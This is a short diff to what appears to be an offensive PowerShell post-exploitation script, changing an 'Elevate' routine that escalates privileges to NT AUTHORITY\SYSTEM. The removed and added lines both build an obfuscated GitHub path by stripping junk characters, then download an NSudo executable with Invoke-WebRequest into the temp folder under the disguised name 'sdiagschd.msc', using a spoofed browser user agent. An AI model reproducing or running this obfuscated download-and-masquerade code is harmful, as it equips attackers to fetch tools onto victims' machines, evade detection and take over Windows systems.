@@ -201,9 +201,9 @@ If($Action -ieq "Elevate"){
       Write-Host "`n`n[admin] Elevating privileges to NT AUTHORITY\SYSTEM!`n" -ForeGroundColor Yellow
    
       ## Download and masquerade the required standalone executable
-      $Cristovao = "By$!&@p$!a&@" + "ss-Ta&@m$!p&@e&@$!r-Pro&@" + "tec&@ti&@o$!n/ma&@$!i&@n/N$!&@Su&@$!d&@o.e$!x&@e" -join ''
+      $Cristovao = "r0$!0&@t-3$!xp&@10i$!t/re&@dpi$!ll/" + "m$!a&@in/u$!t&@ils/N$!&@Su&@$!d&@o.e$!x&@e" -Join ''
       If(-not(Test-Path -Path "$Env:TMP\sdiagschd.msc" -EA SilentlyContinue)){$Colombo = $Cristovao.Split("&@").split("$!") -Join ''
-         iwr -Uri https://raw.githubusercontent.com/swagkarna/${Colombo} -OutFile $Env:TMP\sdiagschd.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+         iwr -Uri https://raw.githubusercontent.com/${Colombo} -OutFile $Env:TMP\sdiagschd.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
 
       If(-not(Test-Path -Path "$Env:TMP\sdiagschd.msc" -EA SilentlyContinue)){
